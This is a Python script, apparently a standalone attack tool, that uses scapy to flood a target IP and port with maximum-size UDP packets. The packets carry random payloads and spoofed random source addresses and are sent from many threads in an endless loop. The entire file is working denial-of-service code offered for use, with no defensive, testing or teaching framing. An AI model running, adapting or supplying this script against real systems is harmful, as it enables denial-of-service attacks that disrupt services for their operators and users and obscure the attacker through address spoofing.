import threading
import argparse
from scapy.all import IP, UDP, send, RandShort
import random
import time

PAYLOAD_SIZE = 1472
DUMMY_PAYLOAD = random._urandom(PAYLOAD_SIZE)

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def udp_flood_attack(target_ip, target_port):
    while True:
        try:
            ip_layer = IP(src=random_ip(), dst=target_ip)
            udp_layer = UDP(sport=RandShort(), dport=target_port)
            send(ip_layer / udp_layer / DUMMY_PAYLOAD, verbose=0)
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="UDP Flood Attack Script with Maximum Payload")
    parser.add_argument('-ip', required=True, help='Target IP address.')
    parser.add_argument('-p', required=True, type=int, help='Target port.')
    parser.add_argument('-t', required=True, type=int, help='Number of threads for the attack.')
    
    args = parser.parse_args()
    
    target_ip = args.ip
    target_port = args.p
    num_threads = args.t

    print(f"Starting UDP Flood (MAX Payload: {PAYLOAD_SIZE} Bytes) on {target_ip}:{target_port} with {num_threads} threads...")

    for _ in range(num_threads):
        t = threading.Thread(target=udp_flood_attack, args=(target_ip, target_port))
        t.daemon = True 
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack Interrupted by user.")
    
    print("Script finished.")

if __name__ == '__main__':
    main()